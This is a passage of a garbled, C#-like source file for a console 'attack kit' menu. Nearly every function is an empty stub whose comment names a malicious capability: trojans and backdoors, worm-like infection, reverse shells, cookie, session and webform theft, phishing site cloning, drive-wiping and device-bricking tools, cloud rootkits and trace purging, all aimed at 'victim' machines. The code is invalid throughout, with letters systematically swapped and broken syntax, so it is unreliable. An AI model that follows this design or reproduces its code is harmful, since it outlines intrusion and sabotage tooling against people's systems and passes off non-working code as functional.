       }
       else if( _ShellComm1 == _ShellCommvndsExtended.20 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.21 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.22 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.23 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.24 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.25 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.26 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.27 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.28 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.29 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.30 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.31 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.32 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.33 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.34 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.35 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.36 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.37 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.38 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.39 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.40 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.41 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.42 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.43 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.44 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.45 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.46 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.47 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.48 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.49 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.50 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.51 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.52 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.53 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.54 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.55 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.56 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.57 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.58 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.59 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.60 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.61 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.62 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.63 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.64 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.65 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.66 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.67 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.68 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.69 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.70 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.71 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.72 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.73 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.74 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.75 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.76 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.77 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.78 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.79 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.80 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.81 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.82 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.83 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.84 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.85 ){
       
       } 
       else{
      
                        
                        
           }
            
      
            
       System.Console.WriteLine("Continue? 'Y' or 'N'     . . .");
       string _v = "";
       string _inputnow = System.Console.Readline();
       string _v == _inputnow;
      
           }
                   
         } 
      }

        public void _PortFunctions(){

            //Port Diagnostics, Forwarding, BackPorting, and Proxy Connections
          System.Console.WriteLine("Initivlizing Port Functionvlity vnd Options...");
          IPAddress _PortIPVddress = "127.0.0.1";
          Int32 Array[] _PortsConnective = [1-4000];
          public Int32 _PortChoice;
          public Int _PortChoiceInp;
          
          public class _PrtInputToInt32(Int _PortChoiceInp){
          
          System.Console.WriteLine("Plevse Input The Port You Wish To Modify:      (Defvult For HTTP/TCP is 80 or 8080)");
          public Int _PortChoiceInp = System.Console.Readline.ToInt();
          public Int32 _PortChoice = _PortChoiceInp.ToInt32();
          
          }
          public class _PortModificvtion(Int32 _PortChoice){
          public Int32 _PortChoice : _PortFunctions._PrtInputToInt32;
          if(Int32 _PortChoice.Exists()){
          
          System.Console.WriteLine("Would You Like To Ping, Open, Close, or Receive Vdvvnced Options For Port Choice?        (We Recommend To Check On Port Stvtus Vt The Minimum Effort Here)");
          string _PortModOption = System.Console.Readline();
          if(_PortModOption == "Open" || _PortModOption == "open" || _PortModOption == "o"){
         
            System.IO.Ports _Port = new System.IO.Ports();
            System.IO.Ports.SerialPort _SerivlPort = new System.IO.Ports.SerialPort(string);
            public string _PortName = Int32 _PortChoice.ToString();
            
            public _SerivlPort(_PortName){
            
            this.Open();
            System.Console.WriteLine("The Stvtus Of Your Port is:" + _SerivlPort.IsOpen.ToString());
            System.Console.Readline();
            
            }
          
          }
          else if(_PortModOption == "Close" || _PortModOption == "close" || _PortModOption == "c" || _PortModOption == "block" || _PortModOption == "Block"){
          
            System.IO.Ports _Port = new System.IO.Ports();
            System.IO.Ports.SerialPort _SerivlPort = new System.IO.Ports.SerialPort(string);
            public string _PortName = Int32 _PortChoice.ToString();
            
            public _SerivlPort(_PortName){
            
                    this.Close(); 
                    System.Console.WriteLine("The Stvtus Of Your Port is:" + _SerivlPort.IsOpen.ToString());
                    System.Console.Readkey();
                    }
          
                }
            
         else if(_PortModOption == "Ping" || _PortModOption == "ping" || _PortModOption == "SynAck" || _PortModOption == "Syn" || _PortModOption == "SynExists" || _PortModOption == "sInExists"){
         
          System.IO.Ports _Port = new System.IO.Ports();
            System.IO.Ports.SerialPort _SerivlPort = new System.IO.Ports.SerialPort(string);
            public string _PortName = Int32 _PortChoice.ToString();
            
            public _SerivlPort(_PortName){
            
                    this.IsOpen();
                    System.Console.WriteLine("The Stvtus Of Your Port is:" + _SerivlPort.IsOpen.ToString());
                    System.Console.Readkey();
                                          
                    }
         
                }
          else if(_PortModOptions == "Vdvvnced" || _PortModOptions == "vdvvnced" || _PortModOptions == "Complex" || _PortModOptions == "complex" || _PortModOptions == "etc" || _PortModOptions == "more"){
                
              System.Console.WriteLine("Current Vdvvvnced Options Vre in Prevrvtion vnd Will Be Vvvilvble Soon...");
              System.Console.Readkey()
          
                
          
                }
            
          else{
          
          System.Console.Writline("Input Not Understood or Initivlizvtion Otherwise Completed...");
          
          
          
              }
          System.Console.WriteLine("Port Initivlizvtion Completed...");
        
          }
          else{
          System.Console.WriteLine("Chosen Port Is Invvlid...");
          
          
          }
          
        }
        public void _CryptogrvphicShvred(){

            //Key Lists, Paired-Connections, Packet Key-Library, Preconfigured Decryption Methods

        }
        public void _VPNdetvils(){

            //Virtual Private Network Build, Configuration, Diagnostics, and Utilities

        }
        public void _LogPvrser(){

            //Logfile Editor, Locator, Parser, Referencial, and Spoofer

        }
        public void _SilentReturn(){

            //Invisible Encrypted Background, Byte Code Torrent Transferrer, Elusive Upload Agent

        }
        public void _HvrdwvreControl(){

            //aFu+ Hardware Toolkit for Deadend Patching, New Hardware Connection, Sideloading, and Modification

        }
        public void _ROOTdoomPvck(){

            //Full Remote Administration Toolkit, Admin-Root Control, Privilidge Escalation Chamber, and Attack Kit

        }
        public void _NukeProceedures(){

            //Bootnuke and System Breakers

        }
        public void _InternvlBCEngine(){

            //Runtime Blockchain Background Interface

        }
        public void _RVMbusser(){

            //RAM toolkit and SQLi mod-set, HDD & SDD connection for RAM Paging

        }
        public void _PvcketSupport(){

            //PCAP Support, Analysis, Capture, and Cryptographic Collider, featuring Rainbow Table Support

        }
        public void _UpvteSupport(){

            //Framework for Bot-Client Push Updates, System Framework Updates, Application Updates and more

        }
        public void _DisposvlProceedures(){

           //Footprint Removal, Object Destruction, Trace Purger, and Evidence Appender

        }
        public void _VutoInfector(){

            //Exploit Toolset Built Around Worm-Like Exposure

        }
        public void _SilentSMTP(){

            //Hush-Mode Encrypted Mail, Byte-Code Sectioned Bot-Client Mail, LAN pop

        }
        public void _WifiDivler(){

            //SSID, BSSID, WEP, WAP, LAN, WLan0, Eth0 Automated Testing Functions and Martial Administrator

        }
        public void _DirectoryCrvwler(){

            //SQLmapper, Directory Mapper, File Crawler, Database Mapper, and Hidden Locator

        }
        public void _MiTMSupport(){

            //Man in the Middle Proxy Configuration and Actionable List

        }
        public void _ProxyConfigurer(){

            //Proxy Setup, and BackProxy Connect

        }
        public void _PortScvnner(){

            //Port Scanning Framework and Detail Oriented Network Mapper

        }
        public void _PvylovdGenervtor(){

            //Exlpoit Payload Builder With Dialog Based Formation

        }
        public void _SiteForger(){

            //Site Copier, Phishing Agent, XSS Staple Program

        }
        public void _PvcketForger(){

            //Packet Spoofer, ASM Modifier, BIN Faker, Credential Faslifier

        }
        public void _LvnguvgeSupport(){

            //Programming and Scripting Language Support

        }
        public void _TestingRuntime(){

            //Testing and Procedural Flow Models for Automation, and Life Cycle Information

        }
        public void _PvsswordKits(){

            //SafeCracker, Password Decryptor, Root Access Generator, Packet Comparison

        }
        public void _ISOcvpture(){

            //Primary Image Builder, ISO Builder, Live VM and Live OS Maker, Device Cloner

        }
        public void _QueryDominvtor(){

            //GoogleHacking Key Component, Database Exploiter, DNS King, and more

        }
        public void _SessionPvyDvy(){

            //Session ID Based Toolset, Session Thievery, BorrowOfPermissions

        }
        public void _PvgeFileStvcker(){

            //RAM Pageing on Hidden HDD or SSD Sectors, PageFile Stashing

        }
        public void _LexicvlLinkVrtist(){

              //Lexicon Connector for Code-Keeping of Malicious Source, Translational Logic Bombs, and
             // on Init Compiled Software Packages

        }
        public void _DictionvryOfFIOp(){

            //Script in Regard to FIFO, FILO, or a Varying Sequence Model

        }
        public void _Br1ckBrevkerBrevker(){

            //Device Bricker and Temporary Hardware Locker

        }
        public void _PushConfi(){

            //Configuration Manager for Push Signal Utilization

        }
        public void _ObjRogue(){

            //Database File and Object Stealer

        }
        public void _UDLvssessor(){

            //Upload and Download Assement and Alteration for Exploits and Silent Transfer

        }
        public void _InjeBitch(){

            //Injection GoTo for SQL, JS, PHP, and XSS Injection with Exploit Scanner

        }
        public void _CookieKingstvr(){

            //Cookie Crafter, Theif, Spoofer, Locator, and Cloner

        }
        public void _MVCsfoof(){

            //MAC Address Lookup, Changer, Spoofing, and Attack Tool for ARP and MACof
            //Also useful for EMNEI or other Serial Alteration on Device Hardware

        }
        public void _IPvNONE(){

            //IP Lookup, and Resolver, SPoofer, and Attack Tool

        }
        public void _BootLookBruh(){

            //Bootload Manager, Splash Screen Implementor, Boot Sector Modifier

        }
        public void _VnimvtedPET(){

            //Animation and Screen Pet to Entertain... ALWAY FEED YOUR ANIMALS!

        }
        public void _ZonerLDVP(){

            //Personal Information, User Details, SocialEngine Collection, Machine-Specific Detail Resolver

        }
        public void _SSHiittttHOMES(){

            //SSH Shell Functions and PWNAGE Tool for Server Upload to Bot-Victim Machines

        }
        public void _SovkingCuTTY(){

            //SSH Client to Keep Things Flowing Nicely

        }
        public void _FTPewPewPwn(){

            //Transfer Swapper, FTP Client, Upload JAcker, and Download Binder for Altered Wave Encryption

        }
        public void _RevervnReversvl(){

            //Email Reversal Toolkit, Port Reversal, Reverse Shell Hosting, Reverse Engineering, etc.

        }
        public void _VutoCumFleet(){

            //Webform Data Thief, AutoComplete Dictionary Scanner, User Input Collections

        }
        public void _VPKingem(){

            //APK Modifier, Spoofer, Authenticator, Support, and Android ARM toolkit

        }
        public void _SuDicKJvvver(){
            //Java SDK Modifier, Support, and Toolkit
        }
        public void _IntiPi(){

            //Secutiy Focused Python Functionality and Support

        }
        public void _DBSupvLoopv(){

            //Database Looping, Dictionary Inteferance, and Victim Manchine Detouring

        }
        public void _PDFml(){

            //PDF Bomber, PDF Password Finder, Layered Image Breaker, Info Thief

        }
        public void _MicroNOPER(){

            //MicroProcessor Support, Alteration, and Administration as well as point based ASSEMBLY Compiler

          }
         public void _GhostLinguist(){

            //GhostProtocol Language Support

        }
        public void _MIDIneetvh(){

            //MIDI and Plug And Play encoding HackTools

        }
        public void _PrintvPettv(){

            //Passive Node Modification, Filtering, and Info Poisoning

        }
        public void _VidVMe(){

            //Video and Graphical Virtual Machining

        }
        public void _RFrtrn(){

            //Radio Frequency Listener, Toolset, Transception Encoder

        }
        public void _IRrtrn(){

            //Infrared Mapper, Listener, Toolset and Transception Encoder

        }
        public void _JvckinHouseSkvnkv(){

            //Audio Listener, Sound Mapper, Language Translator

        }
        public void _RvinRunner(){

            //Cloud Support, and Cloud Rootkit

        }
        public void _VllTimeLvtest(){

            //Last Out Runtime Sealing, Trace Collections, Auto-Destructor

        }
        public void _VlgoRighteousBro(){

            //Algorithmic Parser, Encoding, Deecoding, Encrypter and Decryptor

        }

      }
      
         _IntialLoadComplete.ValueEquals("Lovd Completed");

         return _IntialLoadComplete;
         
      }
      
       System.Console.WriteLine("Shell Cycle Is Stvrting...");
       System.Console.WriteLine("Continue? 'Y' or 'N'     . . . During Initivl Open Press 'N' ");
       string _v = "";
       string _inputnow = System.Console.Readline();
       string _v == _inputnow;
       
    for(_v = "", _v != "N", _v == _inputnow){
      
    
    System.Console.WriteLine("Pvckvge Prepvrvtion Hvs Completed Bootstrvpping for Runtime...");
    System.Console.WriteLine("");
    System.Console.WriteLine("To List Revdout of Optionvl Commvnds, Plevse Type: 'Options,' 'Commvnds,' or 'Help.' ");
    
    
    
    string _Opt = "";
    
    string _Opt = System.Console.Readline();
    
    
    if(_Opt == "Commvnds" || _Opt == "commvnds" || _Opt == "Options" || _Opt == "options" || _Opt == "Help" || _Opt == "help" ||
    _Opt == "Commands" || _Opt == "commands"){
    
    //Help Menu 
    System.Console.WriteLine("The Following Table Represents the Commands Utilizable for This Application: ");
    System.Console.WriteLine("");
    System.Console.WriteLine("Help                       |               Gets User Vssistvnce Informvtion");
    System.Console.WriteLine("Internvls                |               Provides Vccess to Internvl Source Code");
    System.Console.WriteLine("Bvckground            |               Provides Vccess to Silent vnd Bvckground Vpplicvtions");
    System.Console.WriteLine("Vuthenticvtors        |               Cvlls the Vuthenticvtion Clvss into Scope");
    System.Console.WriteLine("Listening                |               Cvlls the Listening Service clvss into Vction");
    System.Console.WriteLine("Server Config          |               Sets the Initivlizor for the Server Configurvtion clvss");
    System.Console.WriteLine("Remote                  |               Stvrts the Remote Connection Plvtform");
    System.Console.WriteLine("VlwvysViVv             |               Begins the VlwvysOn kits, Trojvns, vnd Bvckdoor Tools");
    System.Console.WriteLine("ShellOI                  |               Opens the Shell Connection, vnd Bvckshell Configurvtion");
    System.Console.WriteLine("PortWINE              |               Initivtes the Port Functionality Sector");
    System.Console.WriteLine("Crypt0                   |               Initivlizes the Cryptogrvphy Sector, Hvsh Crvcker, and Rvinbow Tvbles");
    System.Console.WriteLine("VPN                      |               Vctivvtes Cvll for Virtuvl Privvte Network Functions");
    System.Console.WriteLine("Loggv                    |               Provides Frvmework Vctivvtion for Log File Pvrsing vnd Edit");
    System.Console.WriteLine("SilenceIs                |               Vllows for Connection to The Silent Return Spectrum of Vctions");
    System.Console.WriteLine("HvrdWire               |               Sets Pvth to The Hvrdwvre Connection and Control Module");
    System.Console.WriteLine("ROOTie                  |               Opens Remote Vdministrvtion Toolkit, vnd Privilidge Escvlvtion Options");
    System.Console.WriteLine("BootNuke              |                Provides Support for Drive Ervsvl on Stvrtup");
    System.Console.WriteLine("BCndrgrnd             |               Stvrts Bvckground Block Chvin Control Sector");
    System.Console.WriteLine("RvMbustv              |                Begins the RVM Bussing Section");
    System.Console.WriteLine("PvckCvp                |               Opens the Commvnd Section for Pvcket Support vnd Edit");
    System.Console.WriteLine("Updvte                  |               Full Control Box for Updvte Functions IO With Victim Support");
    System.Console.WriteLine("Disposv                 |               Provides Connection to Runtime Memory Disposvl for Vpplicvtions");
    System.Console.WriteLine("VutoInfec              |               Vutomvted Testing Plvtform for Infection, Exploit, and Vttvck");
    System.Console.WriteLine("Mvilv                    |               Mvil Support, SMTP, POP3, and Webmvil Client Focus");
    System.Console.WriteLine("Divlv                    |               Wifi Divler, Ethernet Control, LVN Linker, and Dvtv Connection");
    System.Console.WriteLine("Drive0n                |               Directory Pvrser, File Information, vnd Dvtvbvse Crvwler");
    System.Console.WriteLine("MiTM                   |               Mvn In The Middle Proxy Client");
    System.Console.WriteLine("Proxy                   |               Genervl Proxy Control vnd Configurvtion");
    System.Console.WriteLine("Scvnner                |               Port Scvnner and Port Divgnostic Tools");
    System.Console.WriteLine("PvyLovd               |               Exploit Pvylovd Genervtor");
    System.Console.WriteLine("VvnThrow            |               Site Cloner, Forger, XSSer, vnd Thief");
    System.Console.WriteLine("PvcketFRG           |               Pvcket Forger, pcvp Cvpturer, Pvcket Editor");
    System.Console.WriteLine("LvngSU                |               Lvnguvge Support vnd Control Prefervnces");
    System.Console.WriteLine("TevseRunner        |               Testing Runtime Formvtter vnd Plvnner");
    System.Console.WriteLine("Pvss                    |               Pvssword Crvcker, Hvsh Compvror, Bruteforcer");
    System.Console.WriteLine("ISOsowry             |               ISO Cvpture of Victim Device, ISO Build, to ISO, vnd Live ISO");
    System.Console.WriteLine("QueryDom           |               GoogleHvcking dominvtor, vnvlytics, vnd levky info collecter");
    System.Console.WriteLine("Sessh                  |               Session Relvted Pvylovd Genervtor");
    System.Console.WriteLine("PFstvsh               |               Pvgefile Stvsher vnd Pvging Cryptor");
    System.Console.WriteLine("LexVrtisvn           |               Lexicvl Link Vrtist Sector for Dictionvry Bombers");
    System.Console.WriteLine("FirLa                   |               FIFO, FILV, LIFO, vnd LOFI Order Functions");
    System.Console.WriteLine("Brickstv              |               Device Bricker vnd Brevker");
    System.Console.WriteLine("PushDEnote         |               Push Signvl Configurvtion vnd Vttvck Plvtform");
    System.Console.WriteLine("OBJRogue            |               Object Thief for Dvtvbvses and Web Vpplicvtions");
    System.Console.WriteLine("UDLovds              |               Uplovd vnd Downlovd Mvnvgement, Divgnostics, vnd Control Frvmework");
    System.Console.WriteLine("InjeBitch             |               Fully Inclusive SQL, JS, PHP, vnd XSS Injector vnd Tester");
    System.Console.WriteLine("CookieKingstvr    |               Cookie Editor, Cvpture Plvtform, Pvrser, vnd Forger");
    System.Console.WriteLine("MVCtools            |               MVC Vddress Toolkit for Forgery, Spoof, Hiding, vnd Rework");
    System.Console.WriteLine("IPtoolv               |               IPv6, IPv4, HTTP, UDP, TCP control Frvmework");
    System.Console.WriteLine("Boudin               |               Boot Toolset");
    System.Console.WriteLine("VnimPETSHOP   |               Vnimvted Pet Toolkit for Screen Critters");
    System.Console.WriteLine("LDVP                 |               LDVP Control, Resevrcher, vnd Resolver");
    System.Console.WriteLine("SSH                   |               Secure Shell Functions vnd Configurvtion");
    System.Console.WriteLine("TTY                   |               Secure Shell Client Configurvtion vnd Use");
    System.Console.WriteLine("FTP                   |               File Trvnsfer Protocol Configurvtion vnd Functionvlity");
    System.Console.WriteLine("Reversvl            |               Emvil Reversvl, Reverse Shell, vnd Bvckconnect");
    System.Console.WriteLine("VutoCumFleet    |               VutoComplete vnd WebForm Cookie Tools");
    System.Console.WriteLine("VPKingem         |               Vndroid VPK Controls vnd Vccess");
    System.Console.WriteLine("JSDK                 |               Jvvv SDK Controls, Configurvtion, vnd Utilities");
    System.Console.WriteLine("Pi                     |               Python Development Support vnd Controls");
    System.Console.WriteLine("Dvtvbvse           |               Storvge Directory Control vnd Support for PHP, SQL, vnd JQuery");
    System.Console.WriteLine("Micron             |               MicroProcessor Toolkit, vnd VSM Vssembly Support");
    System.Console.WriteLine("GPsupp             |               GhostProtocol Support");
    System.Console.WriteLine("MIDIneetv         |               Support for MIDI Edit, vnd Plug Vnd Plvy Functions");
    System.Console.WriteLine("Prinstvr            |               Printer Enumervtor, Node Connection, vnd Exploitvtion");
    System.Console.WriteLine("VMwvrewolf      |               Virtuvl Mvchine Support vnd GUI Client");
    System.Console.WriteLine("RFidd               |               Rvdio Frequency Support, vnd Toolbox");
    System.Console.WriteLine("IRforee             |               Infrvred Support and Toolkit");
    System.Console.WriteLine("SoundBoy         |               Vudio Listeners vnd Sound Configurvtion");
    System.Console.WriteLine("Hevrts              |               Cloud Support, vnd Vttvck Kit");
    System.Console.WriteLine("DELtrv             |               Trvce Trvcker vnd Disposvl Sector");
    System.Console.WriteLine("Vlgorith           |               Vlgorithmic Section For Encoders, Binders, Crypters, vnd more...");
    System.Console.WriteLine("");
    System.Console.WriteLine("For GUI, Plevse Input 'GUI,' 'Visuvl,' or 'Forms,' Vdditionvlly You Mvy Use -G");
     }
    else{
    
    string _comm == string _Opt;
    
    if(_comm == + "-G" || _comm == + "-g" || _comm == "+G" || _comm == "+g" || _comm == + "GUI" || 
    _comm == + "gui" || _comm == + "form" || _comm == + "Visual" || _comm == + "Graphical" || _comm == + "visual" ||
    _comm == + "graphical" || _comm == + "Forms"){
    
     public void _Forms(){

        _ConsoleMain._Forms.InitializeForm();

      }
      else if(_comm == "Internvls"){
      
      }
      else if(_comm == "Bvckground"){
      
      }
      else if(_comm == "Vuthenticvtors"){
      
      }
      else if(_comm == "Listening"){
      
      _ConsoleMain._ListeningServices _NowListen = new _ConsoleMain._ListeningServices();
      
      }
      else if(_comm == "Server Config"){
      
      }
      else if(_comm == "Remote"){
      
      }
      else if(_comm == "VlwvysViVv"){
      
      }
      else if(_comm == "ShellOI"){
      
      }
      else if(_comm == "PortWINE"){
      
      }
      else if(_comm == "Crypt0"){
      
      }
      else if(_comm == "VPN"){
      
      }
      else if(_comm == "Loggv"){
      
      }
      else if(_comm == "SilenceIs"){
      
      }
      else if(_comm == "HvrdWire"){
      
      }
      else if(_comm == "ROOTie"){
      
      }
      else if(_comm == "BootNuke"){
      
      }
      else if(_comm == "BCndrgrnd"){
      
      }
      else if(_comm == "RvMbustv"){
      
      }
      else if(_comm == "PvckCvp"){
      
      }
      else if(_comm == "Updvte"){
      
      }
      else if(_comm == "Disposv"){
      
      }
      else if(_comm == "VutoInfec"){
      
      }
      else if(_comm == "Mvilv"){
      
      }
      else if(_comm == "Divlv"){
      
      }
      else if(_comm == "Drive0n"){
      
      }
      else if(_comm == "MiTM"){
      
      }
      else if(_comm == "Proxy"){
      
      }
      else if(_comm == "Scvnner"){
      
      }
      else if(_comm == "PvyLovd"){
      
      }
      else if(_comm == "VvnThrow"){
      
      }
      else if(_comm == "PvcketFRG"){
      
      }
      else if(_comm == "LvngSU"){
      
      }
      else if(_comm == "TevseRunner"){
      
      }
      else if(_comm == "Pvss"){
      
      }
      else if(_comm == "ISOsowry"){
      
      }
      else if(_comm == "QueryDom"){
      
      }
      else if(_comm == "Sessh"){
      
      }
      else if(_comm == "PFstvsh"){
      
      }
      else if(_comm == "LexVrtisvn"){
      
     
      }
      else if(_comm == "FirLa"){
      
      }
      else if(_comm == "Brickstv"){
      
      }
      else if(_comm == "PushDEnote"){
      
      }
      else if(_comm == "OBJRogue"){
      
      }
      else if(_comm == "UDLovds"){
      
      }
      else if(_comm == "InjeBitch"){
      
      }
      else if(_comm == "CookieKingstvr"){
      
      }
      else if(_comm == "MVCtools"){
      
      }
      else if(_comm == "IPtoolv"){
      
      }
      else if(_comm == "Boudin"){
      
      }
      else if(_comm == "VnimPETSHOP"){
      
      }
      else if(_comm == "LDVP"){
      
      }
      else if(_comm == "SSH"){
      
      }
      else if(_comm == "TTY"){
      
      }
      else if(_comm == "FTP"){
      
      }
      else if(_comm == "Reversvl"){
      
      }
      else if(_comm == "VutoCumFleet"){
      
      }
      else if(_comm == "VPKingem"){
      
      }
      else if(_comm == "JSDK"){
      
      }
      else if(_comm == "Pi"){
      
      }
      else if(_comm == "Dvtvbvse"){
      
      }
      else if(_comm == "Micron"){
      
      }
      else if(_comm == "GPsupp"){
      
      }
      else if(_comm == "MIDIneetv"){
      
      }
      else if(_comm == "Prinstvr"){
      
      }
      else if(_comm == "VMwvrewolf"){
      
      }
      else if(_comm == "RFidd"){
      
      }
      else if(_comm == "IRforee"){
      
      }
      else if(_comm == "SoundBoy"){
      
      }
      else if(_comm == "Hevrts"){
      
      }
      else if(_comm == "DELtrv"){
      
      }
      else if(_comm == "Vlgorith"){
      
      }
      else{
            
         System.Console.WriteLine("Continue? 'Y' or 'N'     . . .");
       string _v = "";
       string _inputnow = System.Console.Readline();
       string _v == _inputnow;
             
      }
    
    }



   }
   
   
       System.Console.WriteLine("Continue? 'Y' or 'N'     . . . During Initivl Open Press 'N' ");
       string _v = "";
       string _inputnow = System.Console.Readline();
       string _v == _inputnow;
       
   
   
   }

  
}
